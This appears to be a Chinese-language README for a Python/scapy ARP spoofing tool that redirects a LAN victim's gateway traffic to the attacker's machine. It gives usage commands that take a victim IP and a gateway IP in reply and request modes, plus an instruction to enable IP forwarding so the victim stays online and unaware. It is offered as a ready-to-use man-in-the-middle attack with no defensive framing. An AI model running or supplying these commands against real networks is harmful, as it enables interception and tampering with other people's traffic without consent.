# ARP欺骗代码
本项目可实现局域网的arp欺骗。
# 使用方法
可以将目标主机发往网关的流量定向骗至本主机
安装 scapy 模块
``` bash
sudo apt install python-scapy
```
``` bash
# sudo ./venv/bin/python main.py -i eth0 -t 受害人ip -m rep -s 网关ip
# sudo ./venv/bin/python main.py -i eth0 -t 受害人ip -m req -s 网关ip
```
开启流量转发
> 不开启的话，被欺骗对象无法上网
``` bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```



